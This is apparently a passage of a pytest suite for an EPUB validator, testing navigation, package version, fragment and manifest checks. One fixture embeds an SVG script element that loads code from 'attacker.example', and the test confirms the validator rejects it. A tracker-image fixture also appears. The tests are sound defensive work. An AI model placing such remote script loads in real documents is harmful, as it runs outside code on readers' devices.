<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body><img src="https://example.com/tracker.png" alt="Tracker" /></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    with pytest.raises(RuntimeError, match="remote manifest resource is not permitted"):
        internal_validate(epub)


def test_internal_validate_resolves_foreign_spine_fallbacks(tmp_path: Path) -> None:
    epub = tmp_path / "fallback.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="foreign" href="document.pdf" media-type="application/pdf" fallback="chapter"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="foreign"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="document.pdf">Book</a></li></ol></nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/document.pdf": "PDF fixture",
            "OEBPS/chapter.xhtml": _XHTML,
        },
    )

    internal_validate(epub)


def test_internal_validate_rejects_invalid_package_version(tmp_path: Path) -> None:
    epub = tmp_path / "invalid-version.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3-invalid">
  <metadata/>
  <manifest><item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/></manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    _write_epub(epub, package, {"OEBPS/chapter.xhtml": _XHTML})

    with pytest.raises(RuntimeError, match="expected an EPUB2 or EPUB3 OPF package"):
        internal_validate(epub)


def test_internal_validate_scans_parameterized_svg_scripts(tmp_path: Path) -> None:
    epub = tmp_path / "parameterized-svg-script.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="page" href="page.svg" media-type="image/svg+xml"
          properties="scripted remote-resources"/>
  </manifest>
  <spine><itemref idref="page"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="page.svg">Page</a></li></ol></nav></body>
</html>
"""
    svg = """<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <script type="application/ecmascript; charset=utf-8"
          href="https://attacker.example/code.js"/>
</svg>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/page.svg": svg},
    )

    with pytest.raises(RuntimeError, match="remote resource is missing from the manifest"):
        internal_validate(epub)


def test_internal_validate_rejects_malformed_svg_spine_content(tmp_path: Path) -> None:
    epub = tmp_path / "malformed-svg.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="page" href="page.svg" media-type="image/svg+xml"/>
  </manifest>
  <spine><itemref idref="page"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="page.svg">Page</a></li></ol></nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/page.svg": "not XML"},
    )

    with pytest.raises(RuntimeError, match="malformed SVG content document"):
        internal_validate(epub)


@pytest.mark.parametrize("version", ["2.0", "3.0"])
def test_internal_validate_rejects_empty_navigation(tmp_path: Path, version: str) -> None:
    epub = tmp_path / f"empty-navigation-{version}.epub"
    if version == "3.0":
        navigation_item = (
            '<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>'
        )
        spine_toc = ""
        navigation_name = "OEBPS/nav.xhtml"
        navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head><body><nav epub:type="toc"><ol/></nav></body>
</html>
"""
    else:
        navigation_item = '<item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>'
        spine_toc = ' toc="ncx"'
        navigation_name = "OEBPS/toc.ncx"
        navigation = """<?xml version="1.0"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"><navMap/></ncx>
"""
    package = f"""<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="{version}">
  <metadata/>
  <manifest>
    {navigation_item}
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine{spine_toc}><itemref idref="chapter"/></spine>
</package>
"""
    _write_epub(
        epub,
        package,
        {navigation_name: navigation, "OEBPS/chapter.xhtml": _XHTML},
    )

    with pytest.raises(RuntimeError, match="navigation .* is empty"):
        internal_validate(epub)


def test_internal_validate_rejects_extra_navigation_children(tmp_path: Path) -> None:
    epub = tmp_path / "extra-navigation-child.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head><body><nav epub:type="toc">
    <div>Unexpected</div><ol><li><a href="chapter.xhtml">Book</a></li></ol>
  </nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": _XHTML},
    )

    with pytest.raises(RuntimeError, match="malformed specialized navigation content"):
        internal_validate(epub)


def test_internal_validate_rejects_malformed_specialized_navigation(tmp_path: Path) -> None:
    epub = tmp_path / "malformed-page-list.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head><body>
    <nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav>
    <nav epub:type="page-list"><div>Unexpected</div><ol><li>
      <a href="chapter.xhtml">1</a>
    </li></ol></nav>
  </body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": _XHTML},
    )

    with pytest.raises(RuntimeError, match="malformed specialized navigation content"):
        internal_validate(epub)


def test_internal_validate_uses_non_textual_navigation_labels(tmp_path: Path) -> None:
    epub = tmp_path / "non-textual-label.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
    <item id="icon" href="icon.png" media-type="image/png"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li>
    <a href="chapter.xhtml" title="Book"><img src="icon.png" /></a>
  </li></ol></nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav.xhtml": navigation,
            "OEBPS/chapter.xhtml": _XHTML,
            "OEBPS/icon.png": "PNG fixture",
        },
    )

    internal_validate(epub)


@pytest.mark.parametrize(
    "entry",
    [
        '<a href="chapter.xhtml" aria-label="Book"></a>',
        "<span>Grouping heading</span>",
    ],
)
def test_internal_validate_rejects_invalid_navigation_labels(tmp_path: Path, entry: str) -> None:
    epub = tmp_path / "invalid-label.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = f"""<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li>{entry}</li></ol></nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": _XHTML},
    )

    with pytest.raises(RuntimeError, match="navigation"):
        internal_validate(epub)


@pytest.mark.parametrize("version", ["2.0", "3.0"])
def test_internal_validate_rejects_navigation_outside_the_spine(
    tmp_path: Path, version: str
) -> None:
    epub = tmp_path / f"invalid-navigation-target-{version}.epub"
    if version == "3.0":
        navigation_item = (
            '<item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>'
        )
        spine_toc = ""
        navigation_name = "OEBPS/nav.xhtml"
        navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="missing.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    else:
        navigation_item = '<item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>'
        spine_toc = ' toc="ncx"'
        navigation_name = "OEBPS/toc.ncx"
        navigation = """<?xml version="1.0"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/"><navMap>
  <navPoint id="chapter">
    <navLabel><text>Book</text></navLabel><content src="missing.xhtml"/>
  </navPoint>
</navMap></ncx>
"""
    package = f"""<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="{version}">
  <metadata/>
  <manifest>
    {navigation_item}
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine{spine_toc}><itemref idref="chapter"/></spine>
</package>
"""
    _write_epub(
        epub,
        package,
        {navigation_name: navigation, "OEBPS/chapter.xhtml": _XHTML},
    )

    with pytest.raises(RuntimeError, match="navigation target is not in the spine"):
        internal_validate(epub)


def test_internal_validate_rejects_a_missing_navigation_fragment(tmp_path: Path) -> None:
    epub = tmp_path / "missing-fragment.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head><body><nav epub:type="toc"><ol><li>
    <a href="chapter.xhtml#missing">Book</a>
  </li></ol></nav></body>
</html>
"""
    chapter = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>Book</title></head>
  <body><h1 id="present">Book</h1></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": chapter},
    )

    with pytest.raises(RuntimeError, match="navigation fragment does not exist"):
        internal_validate(epub)


@pytest.mark.parametrize(
    "fragment",
    ["svgView(viewBox(0,0,100,100))", "xywh=0,0,100,100"],
)
def test_internal_validate_accepts_svg_navigation_fragments(tmp_path: Path, fragment: str) -> None:
    epub = tmp_path / "svg-fragment.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="page" href="page.svg" media-type="image/svg+xml"/>
  </manifest>
  <spine><itemref idref="page"/></spine>
</package>
"""
    navigation = f"""<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head><body><nav epub:type="toc"><ol><li>
    <a href="page.svg#{fragment}">Page</a>
  </li></ol></nav></body>
</html>
"""
    svg = """<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
  <rect width="100" height="100"/>
</svg>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/page.svg": svg},
    )

    internal_validate(epub)


def test_internal_validate_rejects_multiple_navigation_documents(tmp_path: Path) -> None:
    epub = tmp_path / "multiple-navigation-documents.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav-a" href="nav-a.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="nav-b" href="nav-b.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    _write_epub(
        epub,
        package,
        {
            "OEBPS/nav-a.xhtml": navigation,
            "OEBPS/nav-b.xhtml": navigation,
            "OEBPS/chapter.xhtml": _XHTML,
        },
    )

    with pytest.raises(RuntimeError, match="exactly one navigation document"):
        internal_validate(epub)


def test_internal_validate_checks_every_container_rootfile(tmp_path: Path) -> None:
    epub = tmp_path / "multiple-renditions.epub"
    package = """<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata/>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine><itemref idref="chapter"/></spine>
</package>
"""
    navigation = """<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Navigation</title></head>
  <body><nav epub:type="toc"><ol><li><a href="chapter.xhtml">Book</a></li></ol></nav></body>
</html>
"""
    container = """<?xml version="1.0"?>
<container xmlns="urn:oasis:names:tc:opendocument:xmlns:container" version="1.0">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
    <rootfile full-path="MISSING/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>
"""
    _write_epub(
        epub,
        package,
        {"OEBPS/nav.xhtml": navigation, "OEBPS/chapter.xhtml": _XHTML},
        container,
    )

    with pytest.raises(RuntimeError, match="missing OPF package"):
        internal_validate(epub)
